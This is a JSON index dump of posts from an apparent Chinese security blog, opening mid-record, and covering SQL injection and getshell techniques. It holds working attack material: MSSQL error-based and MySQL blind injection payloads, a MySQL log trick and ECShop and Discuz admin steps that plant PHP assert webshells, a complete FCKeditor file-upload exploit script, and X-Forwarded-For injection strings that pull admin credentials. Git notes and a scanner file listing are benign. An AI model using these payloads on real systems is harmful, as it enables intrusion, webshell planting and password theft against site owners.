injection","slug":"mssql-error-based-injection","date":"2018-01-14T16:00:00.000Z","updated":"2018-08-02T02:59:25.205Z","comments":true,"path":"2018/01/15/mssql-error-based-injection/","link":"","permalink":"https://exp10it.cn/2018/01/15/mssql-error-based-injection/","excerpt":"MS SQL 是指微软的 SQLServer 数据库服务器, 它是一个数据库平台, 提供数据库的从服务器到终端的完整的解决方案. 听说 mssql 不同版本的注入语句不同 这里的版本是 mssql 2008 db_name() 当前数据库 user 当前用户 @@version 版本 爆库语句 id=1 and (select name from master.dbo.sysdatabases where dbid=1)&gt;0","text":"MS SQL 是指微软的 SQLServer 数据库服务器, 它是一个数据库平台, 提供数据库的从服务器到终端的完整的解决方案. 听说 mssql 不同版本的注入语句不同 这里的版本是 mssql 2008 db_name() 当前数据库 user 当前用户 @@version 版本 爆库语句 id=1 and (select name from master.dbo.sysdatabases where dbid=1)&gt;0 master.dbo.sysdatabases == master..sysdatabases 爆表语句 id=1 and (select top 1 cast(name as varchar(100))%2b&#39;^&#39;%2bcast(id as varchar(100)) from 数据库.dbo.sysobjects where xtype=&#39;U&#39;)&gt;0 暴列语句 id=1 and (select top 1 name from 数据库.dbo.syscolumns where id=id)&gt;0 爆数据语句 id=1 and (select top 1 cast(列名1 as varchar(100))%2b&#39;^&#39;%2bcast(列名2 as varchar(100)) from 数据库.dbo.表名)&gt;0 同数据库的话可以直接 from 表名","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"},{"name":"mssql","slug":"mssql","permalink":"https://exp10it.cn/tags/mssql/"}]},{"title":"mysql log getshell","slug":"mysql-log-getshell","date":"2018-01-08T16:00:00.000Z","updated":"2018-08-02T02:59:28.893Z","comments":true,"path":"2018/01/09/mysql-log-getshell/","link":"","permalink":"https://exp10it.cn/2018/01/09/mysql-log-getshell/","excerpt":"","text":"require root权限 网站物理路径 文件位置未被限制 1234set global general_log = on;set global general_log_file = &apos;F:/phpStudy/WWW/a.php&apos;;select &apos;&lt;?php assert($_POST[a]) ?&gt;&apos;;set global geneal_log = off; 别忘了处理后事 (off)","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://exp10it.cn/tags/mysql/"},{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"}]},{"title":"ecshop 后台 getshell","slug":"ecshop-getshell","date":"2018-01-06T16:00:00.000Z","updated":"2018-08-02T02:59:01.613Z","comments":true,"path":"2018/01/07/ecshop-getshell/","link":"","permalink":"https://exp10it.cn/2018/01/07/ecshop-getshell/","excerpt":"ECShop 是一款 B2C 独立网店系统, 适合企业及个人快速构建个性化网上商店. 模板管理 - 语言项编辑 下拉栏选择 user.php 搜索 用户信息","text":"ECShop 是一款 B2C 独立网店系统, 适合企业及个人快速构建个性化网上商店. 模板管理 - 语言项编辑 下拉栏选择 user.php 搜索 用户信息 后面加上代码 ${${assert($_POST[cmd])}} 确认修改 连接 根目录下 user.php 屡试不爽","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"ecshop","slug":"ecshop","permalink":"https://exp10it.cn/tags/ecshop/"},{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"}]},{"title":"Fckeditor PHP Exp","slug":"fckeditor-exploit","date":"2018-01-05T16:00:00.000Z","updated":"2018-08-02T02:58:57.149Z","comments":true,"path":"2018/01/06/fckeditor-exploit/","link":"","permalink":"https://exp10it.cn/2018/01/06/fckeditor-exploit/","excerpt":"FCKeditor 是一个专门使用在网页上属于开放源代码的所见即所得文字编辑器. Fckeditor &lt;= 2.6.4 PHP &lt;= 5.2 通杀 Exp PHP 高版本不支持截断","text":"FCKeditor 是一个专门使用在网页上属于开放源代码的所见即所得文字编辑器. Fckeditor &lt;= 2.6.4 PHP &lt;= 5.2 通杀 Exp PHP 高版本不支持截断 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;?phperror_reporting(0);set_time_limit(0);ini_set(&quot;default_socket_timeout&quot;, 5);define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));$match = array();function http_send($host, $packet)&#123;$sock = fsockopen($host, 80);while (!$sock)&#123;print &quot;\\n[-] No response from &#123;$host&#125;:80 Trying again...&quot;;$sock = fsockopen($host, 80);&#125;fputs($sock, $packet);while (!feof($sock)) $resp .= fread($sock, 1024);fclose($sock);print $resp;return $resp;&#125;function connector_response($html)&#123;global $match;return (preg_match(&quot;/OnUploadCompleted\\((\\d),\\&quot;(.*)\\&quot;\\)/&quot;, $html, $match) &amp;&amp; in_array($match[1], array(0, 201)));&#125;print &quot;\\n+------------------------------------------------------------------+&quot;;print &quot;\\n| FCKEditor Servelet Arbitrary File Upload Exploit |&quot;;print &quot;\\n+------------------------------------------------------------------+\\n&quot;;if ($argc &lt; 3)&#123;print &quot;\\nUsage......: php $argv[0] host path\\n&quot;;print &quot;\\nExample....: php $argv[0] localhost /\\n&quot;;print &quot;\\nExample....: php $argv[0] localhost /FCKEditor/\\n&quot;;die();&#125;$host = $argv[1];$path = ereg_replace(&quot;(/)&#123;2,&#125;&quot;, &quot;/&quot;, $argv[2]);$filename = &quot;ice.gif&quot;;$foldername = &quot;ice.php%00.gif&quot;;$connector = &quot;editor/filemanager/connectors/php/connector.php&quot;;$payload = &quot;-----------------------------265001916915724\\r\\n&quot;;$payload .= &quot;Content-Disposition: form-data; name=\\&quot;NewFile\\&quot;; filename=\\&quot;&#123;$filename&#125;\\&quot;\\r\\n&quot;;$payload .= &quot;Content-Type: image/jpeg\\r\\n\\r\\n&quot;;$payload .= &apos;GIF89a&apos;.&quot;\\r\\n&quot;.&apos;&lt;?php eval($_POST[ice]) ?&gt;&apos;.&quot;\\n&quot;;$payload .= &quot;-----------------------------265001916915724--\\r\\n&quot;;$packet = &quot;POST &#123;$path&#125;&#123;$connector&#125;?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=&quot;.$foldername.&quot; HTTP/1.0\\r\\n&quot;;//print $packet;$packet .= &quot;Host: &#123;$host&#125;\\r\\n&quot;;$packet .= &quot;Content-Type: multipart/form-data; boundary=---------------------------265001916915724\\r\\n&quot;;$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\\r\\n&quot;;$packet .= &quot;Connection: close\\r\\n\\r\\n&quot;;$packet .= $payload;print $packet;if (!connector_response(http_send($host, $packet))) die(&quot;\\n[-] Upload failed!\\n&quot;);else print &quot;\\n[-] Job done! try http://$&#123;host&#125;/$match[2] \\n&quot;;?&gt;","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"fckeditor","slug":"fckeditor","permalink":"https://exp10it.cn/tags/fckeditor/"},{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/tags/exploit/"}]},{"title":"树洞外链 insert 注入","slug":"tree-hole-insert-injection","date":"2017-12-31T16:00:00.000Z","updated":"2018-08-02T02:58:53.629Z","comments":true,"path":"2018/01/01/tree-hole-insert-injection/","link":"","permalink":"https://exp10it.cn/2018/01/01/tree-hole-insert-injection/","excerpt":"树洞外链是一款免费开源的 PHP 外链网盘系统. /includes/save.php 23-28 行 123456$ip=get_real_ip();$dd=date(&apos;Y-m-d H:i:s&apos;);$rand = md5(time() . mt_rand(0,1000));$stmt = $con-&gt;prepare(&quot;INSERT INTO `$sqlname`.`sd_file` (`ming` ,`key1` ,`uploadip` ,`uploadtime` ,`cishuo` ,`upuser` ,`policyid`)VALUES (?, &apos;$rand&apos;, &apos;$ip&apos;, &apos;$dd&apos;, &apos;0&apos; , &apos;$uploadUser&apos;, &apos;$policyId&apos;);&quot;);$stmt-&gt;bind_param(&apos;s&apos;, $ming);$stmt-&gt;execute(); 调用了 get_real_ip() 之后没有过滤直接 insert","text":"树洞外链是一款免费开源的 PHP 外链网盘系统. /includes/save.php 23-28 行 123456$ip=get_real_ip();$dd=date(&apos;Y-m-d H:i:s&apos;);$rand = md5(time() . mt_rand(0,1000));$stmt = $con-&gt;prepare(&quot;INSERT INTO `$sqlname`.`sd_file` (`ming` ,`key1` ,`uploadip` ,`uploadtime` ,`cishuo` ,`upuser` ,`policyid`)VALUES (?, &apos;$rand&apos;, &apos;$ip&apos;, &apos;$dd&apos;, &apos;0&apos; , &apos;$uploadUser&apos;, &apos;$policyId&apos;);&quot;);$stmt-&gt;bind_param(&apos;s&apos;, $ming);$stmt-&gt;execute(); 调用了 get_real_ip() 之后没有过滤直接 insert /includes/function.php 36-52 行 1234567891011121314151617function get_real_ip()&#123;$ip=false;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))&#123;$ip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];&#125;if (!empty($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) &#123;$ips = explode (&quot;, &quot;, $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);if ($ip) &#123; array_unshift($ips, $ip); $ip = FALSE; &#125;for ($i = 0; $i &lt; count($ips); $i++) &#123;if (!eregi (&quot;^(10|172\\.16|192\\.168)\\.&quot;, $ips[$i])) &#123;$ip = $ips[$i];break;&#125;&#125;&#125;return ($ip ? $ip : $_SERVER[&apos;REMOTE_ADDR&apos;]);&#125; X-Forwarded-For 构造 payload 1X-Forwarded-For: 1.1.1.1&apos;,user(),&apos;0&apos;,uid,uid); # 注册用户 个人资料 - 查看 uid 访问 /includes/save.php 别忘了带上 ming 参数 (post) 添加 X-Forwarded-For 更改uid 查看我的文件 root@localhost exp 12username: X-Forwarded-For: 1.1.1.1&apos;,(select username from sd_user where id=1),&apos;0&apos;,uid,uid); #password: X-Forwarded-For: 1.1.1.1&apos;,(select pwd from sd_user where id=1),&apos;0&apos;,uid,uid); #","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"},{"name":"sql","slug":"sql","permalink":"https://exp10it.cn/tags/sql/"}]},{"title":"mysql 盲注笔记","slug":"mysql-blind-injection-note","date":"2017-12-24T16:00:00.000Z","updated":"2018-08-02T02:58:49.853Z","comments":true,"path":"2017/12/25/mysql-blind-injection-note/","link":"","permalink":"https://exp10it.cn/2017/12/25/mysql-blind-injection-note/","excerpt":"盲注分为布尔盲注和时间盲注 函数盲注需要用到的函数 123456789101112131415161718left(a,b) 从左侧截取a的前b位left(12345,2) --&gt; 12length(a) 获取a的长度length(12345) --&gt; 5substr(a,b,c)、mid(a,b,c) 从b开始 截取a的c位substr(12345,1,2) --&gt; 12ascii(a)、ord(a) 转a为ascii码ascii(1) --&gt; 49if(a,b,c) 如果a成立 执行b 否则执行cif(1&gt;0,1,0) --&gt; 1sleep(a) 运行a秒benchmark(a,b) 执行b a次","text":"盲注分为布尔盲注和时间盲注 函数盲注需要用到的函数 123456789101112131415161718left(a,b) 从左侧截取a的前b位left(12345,2) --&gt; 12length(a) 获取a的长度length(12345) --&gt; 5substr(a,b,c)、mid(a,b,c) 从b开始 截取a的c位substr(12345,1,2) --&gt; 12ascii(a)、ord(a) 转a为ascii码ascii(1) --&gt; 49if(a,b,c) 如果a成立 执行b 否则执行cif(1&gt;0,1,0) --&gt; 1sleep(a) 运行a秒benchmark(a,b) 执行b a次 布尔盲注数据库1234567891011121314151617181920id=1 and length(database())=8 --&gt; True使用 left()id=1 and left(database(),1)=&apos;s&apos; --&gt; Trueid=1 and left(database(),2)=&apos;se&apos; --&gt; Trueid=1 and left(database(),3)=&apos;sec&apos; --&gt; True...使用 substr() + ascii() / mid() + ord()id=1 and ascii(substr(database(),1,1))=115 --&gt; Trueid=1 and ascii(substr(database(),2,1))=101 --&gt; Trueid=1 and ascii(substr(database(),3,1))=99 --&gt; True...如果不嫌蛋疼还可以用 hex()id=1 and hex(substr(database(),1,1))=0x73 --&gt; True... 表、列、内容 1234567891011121314151617id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 2,1))=4 --&gt; Ture使用 left()id=1 and left((select table_name from information_schema.tables where table_schema=database() limit 2,1),1)=&apos;u&apos; --&gt; Trueid=1 and left((select table_name from information_schema.tables where table_schema=database() limit 2,1),2)=&apos;us&apos; --&gt; Trueid=1 and left((select table_name from information_schema.tables where table_schema=database() limit 2,1),3)=&apos;use&apos; --&gt; True...使用 substr() + ascii() / mid() + ord()id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))=117 --&gt; Trueid=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),2,1))=115 --&gt; Trueid=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),3,1))=101 --&gt; True...注意使用 limit n,n 限制查询条数 以此类推 时间盲注多加了一层 if 12id=1 and if(length(database())=8,sleep(5),0)id=1 and sleep(if(length(database())=8,5,0)) 其他部分和布尔盲注没什么不同","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://exp10it.cn/tags/mysql/"},{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"}]},{"title":"360webscan 源码","slug":"360-webscan-source-code","date":"2017-12-09T16:00:00.000Z","updated":"2018-08-02T02:58:43.757Z","comments":true,"path":"2017/12/10/360-webscan-source-code/","link":"","permalink":"https://exp10it.cn/2017/12/10/360-webscan-source-code/","excerpt":"","text":"目录结构 12345678910111213141516360webscan│ index.php│ webscan360.class.php│ webscan360_admin.php│ webscan360_config.php│ ├─360safe│ 360scan.php│ 360webscan.php│ index.php│ webscan_cache.php│ └─lib index.php webscan360_db.class.php webscan360_http.class.php webscan360.zip","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"360","slug":"360","permalink":"https://exp10it.cn/tags/360/"}]},{"title":"discuz 后台 getshell","slug":"discuz-x3-getshell","date":"2017-12-06T16:00:00.000Z","updated":"2018-08-02T02:58:23.589Z","comments":true,"path":"2017/12/07/discuz-x3-getshell/","link":"","permalink":"https://exp10it.cn/2017/12/07/discuz-x3-getshell/","excerpt":"适用于 Discuz X3.3 及之前版本 站长 - Ucenter 设置 - Ucenter 应用 ID","text":"适用于 Discuz X3.3 及之前版本 站长 - Ucenter 设置 - Ucenter 应用 ID 填入代码 123&#39;);file_put_contents(&#39;a.php&#39;,&#39;&lt;?php assert($_POST[a])?&gt;&#39;);// 保存 本地查看 config_ucenter.php 访问 /config/config_ucenter.php 空白 file_put_contents 执行成功 连接 a.php","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"},{"name":"discuz","slug":"discuz","permalink":"https://exp10it.cn/tags/discuz/"}]},{"title":"php bypass safedog","slug":"php-bypass-safedog","date":"2017-12-05T16:00:00.000Z","updated":"2018-08-02T02:58:19.517Z","comments":true,"path":"2017/12/06/php-bypass-safedog/","link":"","permalink":"https://exp10it.cn/2017/12/06/php-bypass-safedog/","excerpt":"","text":"原理通过 GET 获取 a 和 b 并进行 base64 解码, 最后拼接执行. 123456&lt;?php$a = $_GET[&apos;a&apos;];$b = $_GET[&apos;b&apos;];$c = base64_decode($a).base64_decode($b);$c = $_REQUEST[&apos;cmd&apos;];?&gt;","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"},{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"}]},{"title":"Git 学习笔记","slug":"git-study-note","date":"2017-12-04T16:00:00.000Z","updated":"2018-08-02T02:58:13.297Z","comments":true,"path":"2017/12/05/git-study-note/","link":"","permalink":"https://exp10it.cn/2017/12/05/git-study-note/","excerpt":"基本操作初始化仓库 git init 添加文件到暂存区 git add file 提交到版本库 git commit -m &#39;text&#39;","text":"基本操作初始化仓库 git init 添加文件到暂存区 git add file 提交到版本库 git commit -m &#39;text&#39; 比较文件 git diff file 日志查看工作区状态 git status 查看当前commit记录 git log 查看所有commit记录 git reflog 版本回退回退指定版本 git reset --hard HEAD^ git reset --hard HEAD~n git reset --hard commit id 撤销暂存区文件 git reset HEAD file 撤销工作区文件 git checkout -- file 删除版本库文件 git rm file 远程库添加远程库 git remote add origin 删除远程库 git remote rm origin 推送 git push -u origin master git push origin master 拉取 git pull remote master 克隆 git clone 分支创建并切换分支 git checkout -b name 创建分支 git branch name 切换分支 git checkout name 查看当前分支 git branch 合并分支 git merge name 删除分支 git branch -d name 标签添加标签 git tag 指定添加标签 git tag commit id 查看标签commit内容 git show tag name 删除标签 git tag -d name 推送标签 git push remote tag name","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"},{"name":"git","slug":"git","permalink":"https://exp10it.cn/tags/git/"}]}]}